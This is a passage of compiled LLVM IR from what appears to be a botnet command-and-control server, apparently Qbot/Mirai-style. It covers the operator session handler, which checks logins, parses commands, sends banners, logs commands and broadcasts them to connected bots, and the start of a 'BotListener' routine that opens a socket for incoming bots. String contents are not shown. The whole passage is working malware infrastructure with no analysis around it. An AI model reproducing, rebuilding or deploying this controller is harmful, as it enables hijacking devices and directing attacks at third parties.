  %590 = load i32, i32* %4, align 4
  %591 = getelementptr inbounds [800 x i8], [800 x i8]* %47, i64 0, i64 0
  %592 = getelementptr inbounds [800 x i8], [800 x i8]* %47, i64 0, i64 0
  %593 = call i64 @strlen(i8* %592) #8
  %594 = call i64 @send(i32 %590, i8* %591, i64 %593, i32 16384)
  %595 = icmp eq i64 %594, -1
  br i1 %595, label %596, label %597

596:                                              ; preds = %589
  br label %959

597:                                              ; preds = %589
  %598 = load i32, i32* %4, align 4
  %599 = getelementptr inbounds [800 x i8], [800 x i8]* %48, i64 0, i64 0
  %600 = getelementptr inbounds [800 x i8], [800 x i8]* %48, i64 0, i64 0
  %601 = call i64 @strlen(i8* %600) #8
  %602 = call i64 @send(i32 %598, i8* %599, i64 %601, i32 16384)
  %603 = icmp eq i64 %602, -1
  br i1 %603, label %604, label %605

604:                                              ; preds = %597
  br label %959

605:                                              ; preds = %597
  %606 = load i32, i32* %4, align 4
  %607 = getelementptr inbounds [800 x i8], [800 x i8]* %49, i64 0, i64 0
  %608 = getelementptr inbounds [800 x i8], [800 x i8]* %49, i64 0, i64 0
  %609 = call i64 @strlen(i8* %608) #8
  %610 = call i64 @send(i32 %606, i8* %607, i64 %609, i32 16384)
  %611 = icmp eq i64 %610, -1
  br i1 %611, label %612, label %613

612:                                              ; preds = %605
  br label %959

613:                                              ; preds = %605
  %614 = load i8*, i8** %3, align 8
  %615 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %614) #9
  %616 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i64 0, i64 0
  %617 = load i32, i32* %5, align 4
  %618 = sext i32 %617 to i64
  %619 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %618
  %620 = getelementptr inbounds %struct.login_info, %struct.login_info* %619, i32 0, i32 0
  %621 = getelementptr inbounds [100 x i8], [100 x i8]* %620, i64 0, i64 0
  %622 = call i32 (i8*, i8*, ...) @sprintf(i8* %616, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.36, i64 0, i64 0), i8* %621) #9
  %623 = load i32, i32* %4, align 4
  %624 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i64 0, i64 0
  %625 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i64 0, i64 0
  %626 = call i64 @strlen(i8* %625) #8
  %627 = call i64 @send(i32 %623, i8* %624, i64 %626, i32 16384)
  %628 = icmp eq i64 %627, -1
  br i1 %628, label %629, label %630

629:                                              ; preds = %613
  br label %959

630:                                              ; preds = %613
  br label %464, !llvm.loop !19

631:                                              ; preds = %527
  %632 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %633 = call i8* @strstr(i8* %632, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.50, i64 0, i64 0)) #8
  %634 = icmp ne i8* %633, null
  br i1 %634, label %635, label %715

635:                                              ; preds = %631
  %636 = load i8*, i8** %3, align 8
  %637 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %636) #9
  %638 = getelementptr inbounds [800 x i8], [800 x i8]* %51, i64 0, i64 0
  %639 = call i32 (i8*, i8*, ...) @sprintf(i8* %638, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.51, i64 0, i64 0)) #9
  %640 = getelementptr inbounds [800 x i8], [800 x i8]* %52, i64 0, i64 0
  %641 = call i32 (i8*, i8*, ...) @sprintf(i8* %640, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.52, i64 0, i64 0)) #9
  %642 = getelementptr inbounds [800 x i8], [800 x i8]* %53, i64 0, i64 0
  %643 = call i32 (i8*, i8*, ...) @sprintf(i8* %642, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.53, i64 0, i64 0)) #9
  %644 = getelementptr inbounds [800 x i8], [800 x i8]* %54, i64 0, i64 0
  %645 = call i32 (i8*, i8*, ...) @sprintf(i8* %644, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.54, i64 0, i64 0)) #9
  %646 = getelementptr inbounds [800 x i8], [800 x i8]* %55, i64 0, i64 0
  %647 = call i32 (i8*, i8*, ...) @sprintf(i8* %646, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.55, i64 0, i64 0)) #9
  %648 = getelementptr inbounds [800 x i8], [800 x i8]* %56, i64 0, i64 0
  %649 = call i32 (i8*, i8*, ...) @sprintf(i8* %648, i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.56, i64 0, i64 0)) #9
  %650 = load i32, i32* %4, align 4
  %651 = getelementptr inbounds [800 x i8], [800 x i8]* %51, i64 0, i64 0
  %652 = getelementptr inbounds [800 x i8], [800 x i8]* %51, i64 0, i64 0
  %653 = call i64 @strlen(i8* %652) #8
  %654 = call i64 @send(i32 %650, i8* %651, i64 %653, i32 16384)
  %655 = icmp eq i64 %654, -1
  br i1 %655, label %656, label %657

656:                                              ; preds = %635
  br label %959

657:                                              ; preds = %635
  %658 = load i32, i32* %4, align 4
  %659 = getelementptr inbounds [800 x i8], [800 x i8]* %52, i64 0, i64 0
  %660 = getelementptr inbounds [800 x i8], [800 x i8]* %52, i64 0, i64 0
  %661 = call i64 @strlen(i8* %660) #8
  %662 = call i64 @send(i32 %658, i8* %659, i64 %661, i32 16384)
  %663 = icmp eq i64 %662, -1
  br i1 %663, label %664, label %665

664:                                              ; preds = %657
  br label %959

665:                                              ; preds = %657
  %666 = load i32, i32* %4, align 4
  %667 = getelementptr inbounds [800 x i8], [800 x i8]* %53, i64 0, i64 0
  %668 = getelementptr inbounds [800 x i8], [800 x i8]* %53, i64 0, i64 0
  %669 = call i64 @strlen(i8* %668) #8
  %670 = call i64 @send(i32 %666, i8* %667, i64 %669, i32 16384)
  %671 = icmp eq i64 %670, -1
  br i1 %671, label %672, label %673

672:                                              ; preds = %665
  br label %959

673:                                              ; preds = %665
  %674 = load i32, i32* %4, align 4
  %675 = getelementptr inbounds [800 x i8], [800 x i8]* %54, i64 0, i64 0
  %676 = getelementptr inbounds [800 x i8], [800 x i8]* %54, i64 0, i64 0
  %677 = call i64 @strlen(i8* %676) #8
  %678 = call i64 @send(i32 %674, i8* %675, i64 %677, i32 16384)
  %679 = icmp eq i64 %678, -1
  br i1 %679, label %680, label %681

680:                                              ; preds = %673
  br label %959

681:                                              ; preds = %673
  %682 = load i32, i32* %4, align 4
  %683 = getelementptr inbounds [800 x i8], [800 x i8]* %55, i64 0, i64 0
  %684 = getelementptr inbounds [800 x i8], [800 x i8]* %55, i64 0, i64 0
  %685 = call i64 @strlen(i8* %684) #8
  %686 = call i64 @send(i32 %682, i8* %683, i64 %685, i32 16384)
  %687 = icmp eq i64 %686, -1
  br i1 %687, label %688, label %689

688:                                              ; preds = %681
  br label %959

689:                                              ; preds = %681
  %690 = load i32, i32* %4, align 4
  %691 = getelementptr inbounds [800 x i8], [800 x i8]* %56, i64 0, i64 0
  %692 = getelementptr inbounds [800 x i8], [800 x i8]* %56, i64 0, i64 0
  %693 = call i64 @strlen(i8* %692) #8
  %694 = call i64 @send(i32 %690, i8* %691, i64 %693, i32 16384)
  %695 = icmp eq i64 %694, -1
  br i1 %695, label %696, label %697

696:                                              ; preds = %689
  br label %959

697:                                              ; preds = %689
  %698 = load i8*, i8** %3, align 8
  %699 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %698) #9
  %700 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i64 0, i64 0
  %701 = load i32, i32* %5, align 4
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %702
  %704 = getelementptr inbounds %struct.login_info, %struct.login_info* %703, i32 0, i32 0
  %705 = getelementptr inbounds [100 x i8], [100 x i8]* %704, i64 0, i64 0
  %706 = call i32 (i8*, i8*, ...) @sprintf(i8* %700, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.36, i64 0, i64 0), i8* %705) #9
  %707 = load i32, i32* %4, align 4
  %708 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i64 0, i64 0
  %709 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i64 0, i64 0
  %710 = call i64 @strlen(i8* %709) #8
  %711 = call i64 @send(i32 %707, i8* %708, i64 %710, i32 16384)
  %712 = icmp eq i64 %711, -1
  br i1 %712, label %713, label %714

713:                                              ; preds = %697
  br label %959

714:                                              ; preds = %697
  br label %464, !llvm.loop !19

715:                                              ; preds = %631
  %716 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %717 = call i8* @strstr(i8* %716, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.57, i64 0, i64 0)) #8
  %718 = icmp ne i8* %717, null
  br i1 %718, label %719, label %726

719:                                              ; preds = %715
  %720 = getelementptr inbounds [2048 x i8], [2048 x i8]* %58, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %720, i8 0, i64 2048, i1 false)
  %721 = getelementptr inbounds [2048 x i8], [2048 x i8]* %58, i64 0, i64 0
  %722 = call i32 (i8*, i8*, ...) @sprintf(i8* %721, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.58, i64 0, i64 0)) #9
  %723 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %724 = load i32, i32* %4, align 4
  %725 = getelementptr inbounds [2048 x i8], [2048 x i8]* %58, i64 0, i64 0
  call void @broadcast(i8* %723, i32 %724, i8* %725)
  br label %464, !llvm.loop !19

726:                                              ; preds = %715
  %727 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %728 = call i8* @strstr(i8* %727, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i64 0, i64 0)) #8
  %729 = icmp ne i8* %728, null
  br i1 %729, label %730, label %761

730:                                              ; preds = %726
  %731 = getelementptr inbounds [2048 x i8], [2048 x i8]* %59, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %731, i8 0, i64 2048, i1 false)
  %732 = getelementptr inbounds [2048 x i8], [2048 x i8]* %59, i64 0, i64 0
  %733 = call i32 (i8*, i8*, ...) @sprintf(i8* %732, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.60, i64 0, i64 0)) #9
  %734 = getelementptr inbounds [2048 x i8], [2048 x i8]* %59, i64 0, i64 0
  %735 = load i32, i32* %4, align 4
  call void @broadcast(i8* %734, i32 %735, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.61, i64 0, i64 0))
  %736 = load i32, i32* %4, align 4
  %737 = getelementptr inbounds [2048 x i8], [2048 x i8]* %59, i64 0, i64 0
  %738 = getelementptr inbounds [2048 x i8], [2048 x i8]* %59, i64 0, i64 0
  %739 = call i64 @strlen(i8* %738) #8
  %740 = call i64 @send(i32 %736, i8* %737, i64 %739, i32 16384)
  %741 = icmp eq i64 %740, -1
  br i1 %741, label %742, label %743

742:                                              ; preds = %730
  br label %959

743:                                              ; preds = %730
  br label %744

744:                                              ; preds = %743
  %745 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i64 0, i64 0
  %746 = load i32, i32* %5, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %747
  %749 = getelementptr inbounds %struct.login_info, %struct.login_info* %748, i32 0, i32 0
  %750 = getelementptr inbounds [100 x i8], [100 x i8]* %749, i64 0, i64 0
  %751 = call i32 (i8*, i8*, ...) @sprintf(i8* %745, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.36, i64 0, i64 0), i8* %750) #9
  %752 = load i32, i32* %4, align 4
  %753 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i64 0, i64 0
  %754 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i64 0, i64 0
  %755 = call i64 @strlen(i8* %754) #8
  %756 = call i64 @send(i32 %752, i8* %753, i64 %755, i32 16384)
  %757 = icmp eq i64 %756, -1
  br i1 %757, label %758, label %759

758:                                              ; preds = %744
  br label %959

759:                                              ; preds = %744
  br label %760

760:                                              ; preds = %759
  br label %464, !llvm.loop !19

761:                                              ; preds = %726
  %762 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %763 = call i8* @strstr(i8* %762, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i64 0, i64 0)) #8
  %764 = icmp ne i8* %763, null
  br i1 %764, label %765, label %882

765:                                              ; preds = %761
  %766 = getelementptr inbounds [2048 x i8], [2048 x i8]* %62, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %766, i8 0, i64 2048, i1 false)
  %767 = getelementptr inbounds [2048 x i8], [2048 x i8]* %62, i64 0, i64 0
  %768 = call i32 (i8*, i8*, ...) @sprintf(i8* %767, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.63, i64 0, i64 0)) #9
  %769 = load i32, i32* %4, align 4
  %770 = getelementptr inbounds [2048 x i8], [2048 x i8]* %62, i64 0, i64 0
  %771 = getelementptr inbounds [2048 x i8], [2048 x i8]* %62, i64 0, i64 0
  %772 = call i64 @strlen(i8* %771) #8
  %773 = call i64 @send(i32 %769, i8* %770, i64 %772, i32 16384)
  %774 = icmp eq i64 %773, -1
  br i1 %774, label %775, label %776

775:                                              ; preds = %765
  br label %959

776:                                              ; preds = %765
  %777 = load i32, i32* %4, align 4
  %778 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %779 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %780 = call i64 @strlen(i8* %779) #8
  %781 = call i64 @send(i32 %777, i8* %778, i64 %780, i32 16384)
  %782 = icmp eq i64 %781, -1
  br i1 %782, label %783, label %784

783:                                              ; preds = %776
  br label %959

784:                                              ; preds = %776
  %785 = load i32, i32* %4, align 4
  %786 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %787 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %788 = call i64 @strlen(i8* %787) #8
  %789 = call i64 @send(i32 %785, i8* %786, i64 %788, i32 16384)
  %790 = icmp eq i64 %789, -1
  br i1 %790, label %791, label %792

791:                                              ; preds = %784
  br label %959

792:                                              ; preds = %784
  %793 = load i32, i32* %4, align 4
  %794 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %795 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %796 = call i64 @strlen(i8* %795) #8
  %797 = call i64 @send(i32 %793, i8* %794, i64 %796, i32 16384)
  %798 = icmp eq i64 %797, -1
  br i1 %798, label %799, label %800

799:                                              ; preds = %792
  br label %959

800:                                              ; preds = %792
  %801 = load i32, i32* %4, align 4
  %802 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %803 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %804 = call i64 @strlen(i8* %803) #8
  %805 = call i64 @send(i32 %801, i8* %802, i64 %804, i32 16384)
  %806 = icmp eq i64 %805, -1
  br i1 %806, label %807, label %808

807:                                              ; preds = %800
  br label %959

808:                                              ; preds = %800
  %809 = load i32, i32* %4, align 4
  %810 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %811 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %812 = call i64 @strlen(i8* %811) #8
  %813 = call i64 @send(i32 %809, i8* %810, i64 %812, i32 16384)
  %814 = icmp eq i64 %813, -1
  br i1 %814, label %815, label %816

815:                                              ; preds = %808
  br label %959

816:                                              ; preds = %808
  %817 = load i32, i32* %4, align 4
  %818 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %819 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %820 = call i64 @strlen(i8* %819) #8
  %821 = call i64 @send(i32 %817, i8* %818, i64 %820, i32 16384)
  %822 = icmp eq i64 %821, -1
  br i1 %822, label %823, label %824

823:                                              ; preds = %816
  br label %959

824:                                              ; preds = %816
  %825 = load i32, i32* %4, align 4
  %826 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %827 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %828 = call i64 @strlen(i8* %827) #8
  %829 = call i64 @send(i32 %825, i8* %826, i64 %828, i32 16384)
  %830 = icmp eq i64 %829, -1
  br i1 %830, label %831, label %832

831:                                              ; preds = %824
  br label %959

832:                                              ; preds = %824
  %833 = load i32, i32* %4, align 4
  %834 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %835 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %836 = call i64 @strlen(i8* %835) #8
  %837 = call i64 @send(i32 %833, i8* %834, i64 %836, i32 16384)
  %838 = icmp eq i64 %837, -1
  br i1 %838, label %839, label %840

839:                                              ; preds = %832
  br label %959

840:                                              ; preds = %832
  %841 = load i32, i32* %4, align 4
  %842 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %843 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %844 = call i64 @strlen(i8* %843) #8
  %845 = call i64 @send(i32 %841, i8* %842, i64 %844, i32 16384)
  %846 = icmp eq i64 %845, -1
  br i1 %846, label %847, label %848

847:                                              ; preds = %840
  br label %959

848:                                              ; preds = %840
  %849 = load i32, i32* %4, align 4
  %850 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i64 0, i64 0
  %851 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i64 0, i64 0
  %852 = call i64 @strlen(i8* %851) #8
  %853 = call i64 @send(i32 %849, i8* %850, i64 %852, i32 16384)
  %854 = icmp eq i64 %853, -1
  br i1 %854, label %855, label %856

855:                                              ; preds = %848
  br label %959

856:                                              ; preds = %848
  %857 = load i32, i32* %4, align 4
  %858 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %859 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %860 = call i64 @strlen(i8* %859) #8
  %861 = call i64 @send(i32 %857, i8* %858, i64 %860, i32 16384)
  %862 = icmp eq i64 %861, -1
  br i1 %862, label %863, label %864

863:                                              ; preds = %856
  br label %959

864:                                              ; preds = %856
  br label %865

865:                                              ; preds = %864
  %866 = getelementptr inbounds [5000 x i8], [5000 x i8]* %63, i64 0, i64 0
  %867 = load i32, i32* %5, align 4
  %868 = sext i32 %867 to i64
  %869 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %868
  %870 = getelementptr inbounds %struct.login_info, %struct.login_info* %869, i32 0, i32 0
  %871 = getelementptr inbounds [100 x i8], [100 x i8]* %870, i64 0, i64 0
  %872 = call i32 (i8*, i8*, ...) @sprintf(i8* %866, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.36, i64 0, i64 0), i8* %871) #9
  %873 = load i32, i32* %4, align 4
  %874 = getelementptr inbounds [5000 x i8], [5000 x i8]* %63, i64 0, i64 0
  %875 = getelementptr inbounds [5000 x i8], [5000 x i8]* %63, i64 0, i64 0
  %876 = call i64 @strlen(i8* %875) #8
  %877 = call i64 @send(i32 %873, i8* %874, i64 %876, i32 16384)
  %878 = icmp eq i64 %877, -1
  br i1 %878, label %879, label %880

879:                                              ; preds = %865
  br label %959

880:                                              ; preds = %865
  br label %881

881:                                              ; preds = %880
  br label %464, !llvm.loop !19

882:                                              ; preds = %761
  %883 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %884 = call i8* @strstr(i8* %883, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.64, i64 0, i64 0)) #8
  %885 = icmp ne i8* %884, null
  br i1 %885, label %886, label %904

886:                                              ; preds = %882
  %887 = getelementptr inbounds [2048 x i8], [2048 x i8]* %64, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %887, i8 0, i64 2048, i1 false)
  %888 = getelementptr inbounds [2048 x i8], [2048 x i8]* %64, i64 0, i64 0
  %889 = load i32, i32* %5, align 4
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %890
  %892 = getelementptr inbounds %struct.login_info, %struct.login_info* %891, i32 0, i32 0
  %893 = getelementptr inbounds [100 x i8], [100 x i8]* %892, i64 0, i64 0
  %894 = call i32 (i8*, i8*, ...) @sprintf(i8* %888, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.65, i64 0, i64 0), i8* %893) #9
  %895 = load i32, i32* %4, align 4
  %896 = getelementptr inbounds [2048 x i8], [2048 x i8]* %64, i64 0, i64 0
  %897 = getelementptr inbounds [2048 x i8], [2048 x i8]* %64, i64 0, i64 0
  %898 = call i64 @strlen(i8* %897) #8
  %899 = call i64 @send(i32 %895, i8* %896, i64 %898, i32 16384)
  %900 = icmp eq i64 %899, -1
  br i1 %900, label %901, label %902

901:                                              ; preds = %886
  br label %959

902:                                              ; preds = %886
  %903 = call i32 @sleep(i32 2)
  br label %959

904:                                              ; preds = %882
  %905 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %905)
  %906 = getelementptr inbounds [5000 x i8], [5000 x i8]* %65, i64 0, i64 0
  %907 = load i32, i32* %5, align 4
  %908 = sext i32 %907 to i64
  %909 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %908
  %910 = getelementptr inbounds %struct.login_info, %struct.login_info* %909, i32 0, i32 0
  %911 = getelementptr inbounds [100 x i8], [100 x i8]* %910, i64 0, i64 0
  %912 = call i32 (i8*, i8*, ...) @sprintf(i8* %906, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.36, i64 0, i64 0), i8* %911) #9
  %913 = load i32, i32* %4, align 4
  %914 = getelementptr inbounds [5000 x i8], [5000 x i8]* %65, i64 0, i64 0
  %915 = getelementptr inbounds [5000 x i8], [5000 x i8]* %65, i64 0, i64 0
  %916 = call i64 @strlen(i8* %915) #8
  %917 = call i64 @send(i32 %913, i8* %914, i64 %916, i32 16384)
  %918 = icmp eq i64 %917, -1
  br i1 %918, label %919, label %920

919:                                              ; preds = %904
  br label %959

920:                                              ; preds = %904
  %921 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %922 = call i64 @strlen(i8* %921) #8
  %923 = icmp eq i64 %922, 0
  br i1 %923, label %924, label %925

924:                                              ; preds = %920
  br label %464, !llvm.loop !19

925:                                              ; preds = %920
  %926 = load i32, i32* %5, align 4
  %927 = sext i32 %926 to i64
  %928 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %927
  %929 = getelementptr inbounds %struct.login_info, %struct.login_info* %928, i32 0, i32 0
  %930 = getelementptr inbounds [100 x i8], [100 x i8]* %929, i64 0, i64 0
  %931 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %932 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.66, i64 0, i64 0), i8* %930, i8* %931)
  %933 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.67, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i64 0, i64 0))
  store %struct._IO_FILE* %933, %struct._IO_FILE** %66, align 8
  %934 = call i64 @time(i64* null) #9
  store i64 %934, i64* %67, align 8
  %935 = call %struct.tm* @gmtime(i64* %67) #9
  store %struct.tm* %935, %struct.tm** %68, align 8
  %936 = getelementptr inbounds [50 x i8], [50 x i8]* %69, i64 0, i64 0
  %937 = load %struct.tm*, %struct.tm** %68, align 8
  %938 = call i64 @strftime(i8* %936, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.69, i64 0, i64 0), %struct.tm* %937) #9
  %939 = load %struct._IO_FILE*, %struct._IO_FILE** %66, align 8
  %940 = getelementptr inbounds [50 x i8], [50 x i8]* %69, i64 0, i64 0
  %941 = load i32, i32* %5, align 4
  %942 = sext i32 %941 to i64
  %943 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %942
  %944 = getelementptr inbounds %struct.login_info, %struct.login_info* %943, i32 0, i32 0
  %945 = getelementptr inbounds [100 x i8], [100 x i8]* %944, i64 0, i64 0
  %946 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %947 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %939, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.70, i64 0, i64 0), i8* %940, i8* %945, i8* %946)
  %948 = load %struct._IO_FILE*, %struct._IO_FILE** %66, align 8
  %949 = call i32 @fclose(%struct._IO_FILE* %948)
  %950 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %951 = load i32, i32* %4, align 4
  %952 = load i32, i32* %5, align 4
  %953 = sext i32 %952 to i64
  %954 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %953
  %955 = getelementptr inbounds %struct.login_info, %struct.login_info* %954, i32 0, i32 0
  %956 = getelementptr inbounds [100 x i8], [100 x i8]* %955, i64 0, i64 0
  call void @broadcast(i8* %950, i32 %951, i8* %956)
  %957 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %957, i8 0, i64 2048, i1 false)
  br label %464, !llvm.loop !19

958:                                              ; preds = %464
  br label %959

959:                                              ; preds = %958, %919, %902, %901, %879, %863, %855, %847, %839, %831, %823, %815, %807, %799, %791, %783, %775, %758, %742, %713, %696, %688, %680, %672, %664, %656, %629, %612, %604, %596, %588, %580, %572, %564, %556, %525, %455, %439, %431, %423, %415, %407, %399, %391, %383, %375, %367, %359, %327, %326, %319, %310, %302, %293, %285, %276, %268, %259, %251, %242, %234, %179, %173, %158, %130, %124
  %960 = load i32, i32* %4, align 4
  %961 = sext i32 %960 to i64
  %962 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %961
  %963 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %962, i32 0, i32 0
  store i32 0, i32* %963, align 4
  %964 = load i32, i32* %4, align 4
  %965 = call i32 @close(i32 %964)
  %966 = load volatile i32, i32* @OperatorsConnected, align 4
  %967 = add nsw i32 %966, -1
  store volatile i32 %967, i32* @OperatorsConnected, align 4
  br label %968

968:                                              ; preds = %959, %510, %502, %494
  %969 = load i8*, i8** %2, align 8
  ret i8* %969
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64*) #3

; Function Attrs: nounwind
declare i64 @strftime(i8*, i64, i8*, %struct.tm*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %9 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %9, i32* %3, align 4
  %10 = load i32, i32* %3, align 4
  %11 = icmp slt i32 %10, 0
  br i1 %11, label %12, label %13

12:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.71, i64 0, i64 0))
  br label %13

13:                                               ; preds = %12, %1
  %14 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %14, i8 0, i64 16, i1 false)
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %15, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  store i32 0, i32* %17, align 4
  %18 = load i32, i32* %2, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #10
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %22 = load i32, i32* %3, align 4
  %23 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %24 = call i32 @bind(i32 %22, %struct.sockaddr* %23, i32 16) #9
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %27

26:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.72, i64 0, i64 0))
  br label %27

27:                                               ; preds = %26, %13
  %28 = load i32, i32* %3, align 4
